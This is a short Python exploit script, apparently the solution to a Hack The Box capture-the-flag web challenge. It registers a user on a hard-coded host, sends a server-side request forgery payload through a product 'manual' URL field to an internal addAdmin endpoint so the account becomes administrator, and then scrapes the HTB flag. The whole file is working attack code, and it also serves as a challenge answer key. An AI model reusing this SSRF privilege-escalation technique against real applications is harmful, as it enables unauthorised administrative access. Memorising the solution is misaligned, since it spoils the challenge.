import requests
import re

host, port = '94.237.50.221', 41817

url = f'http://{host}:{port}'
login_url = f'{url}/api/login'
register_url = f'{url}/api/register'
home_url = f'{url}/home'
ssrf_url = f'{url}/api/product'
logout_url = f'{url}/logout'

##register account

session = requests.Session()

data = {
    "username": "h4cker",
    "password": "password"
}

register = session.post(register_url, json=data)

##login

login = session.post(login_url, json=data)

## ssrf exploit

form_data = {
    "name":"a",
    "price":"a",
    "description":"a",
    "manual":"http://0:1337/api/addAdmin?username=h4cker"
}

ssrf_exploit = session.post(ssrf_url, json=form_data)

## logout

logout = session.get(logout_url)


## login again
login = session.post(login_url, json=data)
website_content = session.get(home_url)

print(website_content.text)

flag = re.search(r'HTB\{.*?\}', website_content.text) # return matched object 
print(flag.group())

